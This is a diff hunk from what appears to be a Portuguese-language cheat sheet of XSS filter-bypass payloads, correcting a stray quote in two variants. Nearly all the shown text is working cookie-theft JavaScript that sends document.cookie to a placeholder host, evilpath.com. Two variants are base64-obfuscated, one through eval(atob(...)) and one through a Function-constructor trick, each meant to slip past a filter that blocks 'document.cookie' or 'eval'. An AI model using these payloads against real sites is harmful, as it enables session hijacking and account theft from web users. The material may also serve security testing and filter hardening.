@@ -9,12 +9,12 @@ location.href = 'http://evilpath.com/?c='+escape(document.cookie)
 
 Ele não vai funcionar por causa do "document.cookie", uma alternativa seria:
 ```JavaScript
-eval(atob("bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGguY29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk=""))
+eval(atob("bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGguY29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk="))
 ```
 
 Para esse exemplo também não vai funcionar por causa do "eval", outra possibilidade seria:
 ```JavaScript
-[].constructor.constructor(atob("bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGguY29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk=""))()
+[].constructor.constructor(atob("bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGguY29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk="))()
 ```
 
 Outros métodos válidos:
